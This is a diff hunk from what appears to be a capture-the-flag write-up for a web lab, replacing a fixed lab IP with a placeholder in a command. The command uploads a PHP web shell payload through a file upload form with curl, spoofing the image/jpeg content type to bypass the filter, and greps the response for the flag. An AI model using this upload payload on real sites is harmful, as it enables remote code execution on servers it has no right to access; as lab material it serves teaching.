@@ -30,7 +30,7 @@ This HTML form allows file uploads via a POST request, focus on:
 ```sh
 echo "<?php system('ls'); ?>" | \
 curl -F "Upload=Upload" \
--F "uploaded=@-;type=image/jpeg" "http://10.13.248.105/index.php?page=upload" | \
+-F "uploaded=@-;type=image/jpeg" "http://{IP}/index.php?page=upload" | \
 grep "The flag is :"
 ```
 
